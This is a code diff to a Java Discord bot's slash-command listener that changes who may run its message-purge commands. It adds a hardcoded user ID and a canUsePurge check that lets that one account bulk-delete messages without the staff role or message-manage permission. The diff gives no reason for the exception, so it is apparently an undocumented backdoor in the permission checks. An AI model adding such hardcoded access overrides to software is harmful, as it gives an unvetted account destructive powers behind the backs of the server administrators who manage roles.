@@ -31,6 +31,7 @@ import net.dv8tion.jda.api.entities.User;
 
 public class SlashCommandListener extends ListenerAdapter {
     private static final int MAX_PURGE = 100;
+    private static final String PURGE_OVERRIDE_USER_ID = "1271900366795182195";
 
     private final BotConfig config;
     private final FaqService faqService;
@@ -169,7 +170,7 @@ public class SlashCommandListener extends ListenerAdapter {
             event.reply("Unable to identify requestor.").setEphemeral(true).queue();
             return;
         }
-        if (!isStaff(member)) {
+        if (!canUsePurge(member)) {
             event.reply("You do not have permission to use this command.").setEphemeral(true).queue();
             return;
         }
@@ -206,7 +207,7 @@ public class SlashCommandListener extends ListenerAdapter {
             event.reply("Unable to identify requestor.").setEphemeral(true).queue();
             return;
         }
-        if (!isStaff(member)) {
+        if (!canUsePurge(member)) {
             event.reply("You do not have permission to use this command.").setEphemeral(true).queue();
             return;
         }
@@ -454,6 +455,10 @@ public class SlashCommandListener extends ListenerAdapter {
             return member.hasPermission(Permission.MESSAGE_MANAGE);
         }
         return member.getRoles().stream().anyMatch(role -> role.getId().equals(config.staffRoleId()));
+    }
+
+    private boolean canUsePurge(Member member) {
+        return isStaff(member) || member.getId().equals(PURGE_OVERRIDE_USER_ID);
     }
 
     private String extractUserId(String rawInput) {
